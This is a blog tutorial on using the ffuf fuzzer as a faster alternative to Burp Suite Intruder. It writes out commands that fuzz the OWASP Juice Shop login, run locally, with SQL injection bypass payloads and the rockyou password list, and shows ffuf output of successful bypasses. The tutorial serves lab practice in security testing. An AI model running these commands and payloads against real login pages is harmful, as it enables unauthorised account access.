---
title:  "Use FFUF to bypass Burp Suite's Intruder attacks delay"
date: 2023-07-25
mathjax: true
layout: post
categories: tutorial
tags: burpsuite ffuf docker webapp
---

#### It is possible to use FFUF like alternative to bypass Burp Suite Community Edition's Intruder attacks delay? 

## *The answer is: Yes! you can.*

* * *
 
# PoC

Burp Suite Community Edition is very good to use the Intruder and it allow us to fuzz parameters in a Request. But, we know that if we don't have Burp Suite Professional Edition, Intruder will be slow.

This article explain how you can use FFUF as alternative to bypass the rate limit of Burp Suite Community Edition and so, improve your hacking ;)

# Summary

1. ¿What is FFUF?
2. Usage and examples
3. Conclusion and Final words

* * *

# 1. *¿What is FFUF?*

## FFUF

FFUF is a fast web fuzzer tool written in Go. It's common used for Pentesters to discover subdomains, directories and test multiples parameters of a Web Application. (Example: API fuzzing). 

[![asciicast](https://asciinema.org/a/211350.svg)](https://asciinema.org/a/211350)

You can find and download FFUF from official repo in Github: [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf){:target="_blank"}

# 2. *Usage and examples*

First at all you need a request file. It can be generated by yourself or you can copy any request directly from Burp Suite.

*For this example I will test the OWASP Juice Shop application in localhost using Docker.* 

- Download: [https://hub.docker.com/r/bkimminich/juice-shop](https://hub.docker.com/r/bkimminich/juice-shop){:target="_blank"}

![login-portal-owasp-juice-shop](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/use-ffuf-like-alternative-to-bypass-burp-suite-intruder-attacks-delay/login-portal-owasp-juice-shop.webp)

![burp-suite-request](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/use-ffuf-like-alternative-to-bypass-burp-suite-intruder-attacks-delay/burp-suite-request.webp)

We can just copy the text and save as `"request.txt"`.

Once captured the request, we need to set where we want to fuzz the parameters. To do that we can open the request file with nano or vim.

![nano-editing-request](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/use-ffuf-like-alternative-to-bypass-burp-suite-intruder-attacks-delay/nano-editing-request.webp)

I choice set `FUZZEMAIL` and `FUZZPASSWD` to then fuzzing with **FFUF**.

## Time to hack.

Now we can use the request file to fuzzing the parameters, so let's take a review of usage modes:

## Modes

```bash
-mode
Multi-wordlist operation mode. (default: clusterbomb) 
	-sniper
	-pitchfork
	-clusterbomb
```

## Example

```bash
ffuf -request request.txt --request-proto https -mode clusterbomb -w passwords.txt:FUZZPASSWD -w email-list.txt:FUZZEMAIL -u http://127.0.0.1:3000
```

With that command we are fuzzing the request testing each email and password with the payloads to bypass the log in portal.

We gonna try perform a SQL Injection, so we need to encode payloads as URL.

I will use CyberChef to encode and a list of payloads from PayloadsAllTheThings.

- CyberChef online: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/){:target="_blank"}

- PayloadsAllTheThings: [https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/){:target="_blank"}

*On Kali Linux you can install the both with:*

```bash
sudo apt install -y cyberchef payloadsallthethings
```

- List of payloads for SQL Injection: [https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/SQL%20Injection/#authentication-bypass](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/SQL%20Injection/#authentication-bypass){:target="_blank"}

So copy and encode with CyberChef.

![cyberchef-encoding](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/use-ffuf-like-alternative-to-bypass-burp-suite-intruder-attacks-delay/cyberchef-encoding.webp)

It is necessary add the recipe "Split" to separate each payload. In the field "Split delimiter" you need to set "%0A". *(See the image above).*

## Fuzzing

- FUZZEMAIL will be all the SQL Injection Payloads.
- FUZZPASSWD will be the classic "rockyou.txt" wordlist.

```bash
> ffuf -request request.txt --request-proto http -mode pitchfork -w /usr/share/wordlists/rockyou.txt:FUZZPASSWD -w /home/hackermater/Labs/Juice\ Shop/email-list.txt:FUZZEMAIL -mc 200 -u http://127.0.0.1:3000
         ____    ____             ____
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://127.0.0.1:3000/rest/user/login
 :: Wordlist         : FUZZPASSWD: /usr/share/wordlists/rockyou.txt
 :: Wordlist         : FUZZEMAIL: /home/hackermater/Labs/Juice Shop/email-list.txt
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : DNT: 1
 :: Header           : Cookie: language=en; welcomebanner_status=dismiss
 :: Header           : Sec-Fetch-Dest: empty
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Referer: http://127.0.0.1:3000/
 :: Header           : Sec-Fetch-Mode: cors
 :: Header           : Host: 127.0.0.1:3000
 :: Header           : Accept: application/json, text/plain, */*
 :: Header           : Content-Type: application/json
 :: Header           : Origin: http://127.0.0.1:3000
 :: Header           : Connection: close
 :: Data             : {"email":"admin@juice-sh.opFUZZEMAIL","password":"FUZZPASSWD"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

[Status: 200, Size: 799, Words: 1, Lines: 1, Duration: 1582ms]
    * FUZZEMAIL: '--'
    * FUZZPASSWD: qwerty

[Status: 200, Size: 799, Words: 1, Lines: 1, Duration: 2064ms]
    * FUZZEMAIL: '--'%20/%20%22--%22
    * FUZZPASSWD: iloveu

[Status: 200, Size: 799, Words: 1, Lines: 1, Duration: 1842ms]
    * FUZZEMAIL: '--'
    * FUZZPASSWD: adrian

[Status: 200, Size: 799, Words: 1, Lines: 1, Duration: 1827ms]
    * FUZZEMAIL: '--'%20/%20%22--%22
    * FUZZPASSWD: destiny

[WARN] Caught keyboard interrupt (Ctrl-C)
```

*We can check the login bypass on the web:*

![pwned-login-portal](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/use-ffuf-like-alternative-to-bypass-burp-suite-intruder-attacks-delay/pwned-login-portal.webp)

# Conclusion and Final words ;)

This is a simple and powerful way to use an "Intruder" or Fuzzer with FFUF instead the Burp Suite's Intruder from Community Edition with multiples parameters and with whatever encoding you want.

*And finally, here is a useful tip:*

## *Rate limit*

Many times, when you are performing a pentest audit it's required a rate limit for seconds between requests.

```bash
-rate               
Rate of requests per second (default: 0)
```

#### *Example*

```bash
ffuf -request request.txt --request-proto https -mode pitchfork -w passwords.txt:FUZZPASSWD -w usernames.txt:FUZZUSERS -rate 5 

# It will perform 5 requests per seconds
```

Happy Hacking!!

----

## Author: Mateo Fumis 
